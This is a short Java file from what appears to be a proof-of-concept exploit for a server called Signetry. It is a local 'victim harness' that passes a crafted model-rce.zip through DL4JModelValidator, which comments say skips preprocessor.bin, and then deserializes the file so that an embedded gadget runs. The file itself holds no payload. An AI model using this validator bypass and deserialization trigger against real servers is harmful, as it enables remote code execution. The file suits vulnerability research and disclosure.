package local.poc;

import org.deeplearning4j.util.DL4JModelValidator;
import org.deeplearning4j.util.ModelSerializer;
import org.nd4j.common.validation.ValidationResult;

import java.io.File;

/**
 * Local victim harness — mimics exactly what the Signetry server does on upload:
 *   1) validate the model (DL4JModelValidator never inspects preprocessor.bin)
 *   2) load it (ModelSerializer.restoreMultiLayerNetwork triggers the deserialization)
 *
 * Used only to confirm the gadget fires; the real victim is the Spring app.
 */
public class VictimLoad {
    public static void main(String[] args) throws Exception {
        File model = new File(args.length > 0 ? args[0] : "model-rce.zip");

        ValidationResult vr = DL4JModelValidator.validateMultiLayerNetwork(model);
        System.out.println("[victim] validator.isValid=" + vr.isValid()
                + " formatType=" + vr.getFormatType());

        try {
            ModelSerializer.restoreMultiLayerNetwork(model, false);
            System.out.println("[victim] restore returned without exception");
        } catch (Throwable t) {
            // Expected: ClassCastException AFTER the gadget already executed.
            System.out.println("[victim] restore threw (gadget already ran): " + t);
            t.printStackTrace(System.out);
        }
    }
}
